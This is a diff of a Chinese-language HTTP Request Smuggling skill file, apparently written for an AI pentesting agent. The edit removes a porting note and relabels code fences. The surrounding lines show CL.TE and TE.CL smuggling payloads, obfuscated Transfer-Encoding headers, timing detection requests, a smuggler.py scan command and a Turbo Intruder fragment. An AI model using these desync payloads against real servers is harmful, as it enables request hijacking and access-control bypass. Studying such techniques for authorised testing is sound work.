@@ -4,7 +4,7 @@ description: 'HTTP Request Smuggling 完整实战（修正版）：CL.TE/TE.CL/T
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 ## HTTP Request Smuggling / HTTP Desync Attack
 
@@ -31,7 +31,7 @@ Transfer-Encoding: chunked
 0
 
 G
-```
+```text
 - `0\r\n\r\nG` = 6 bytes（0=1, CRLF=2, CRLF=2, G=1）
 - 前端 CL=6 → 全部转发
 - 后端 TE → `0\r\n\r\n` 结束请求，`G` 成为下一个请求的开头
@@ -52,7 +52,7 @@ x=1
 0
 
 
-```
+```text
 - 前端 TE → 全部转发
 - 后端 CL=4 → 只读 `5c\r\n`（4字节），剩余成为下一个请求
 
@@ -66,7 +66,7 @@ Transfer-Encoding:[tab]chunked
 [space]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
-```
+```text
 
 ---
 
@@ -87,7 +87,7 @@ A
 0
 
 
-```
+```text
 
 **TE.CL 检测** — 后端 CL 等更多字节 → 超时：
 ```http
@@ -99,7 +99,7 @@ Content-Length: 6
 
 0
 X
-```
+```text
 
 #### 差异响应检测
 发送两个版本，其中一个走私请求到受限端点 → 如果返回不同（如 403 vs 200）→ 确认。
@@ -116,7 +116,7 @@ X
 ```bash
 # Smuggler 基本用法
 python3 smuggler.py -u https://target.com -t 10
-```
+```text
 
 ---
 
@@ -154,7 +154,7 @@ X-Foo: k'''
 
 def handleResponse(req, interesting):
     table.add(req)
-```
+```text
 
 ---
 
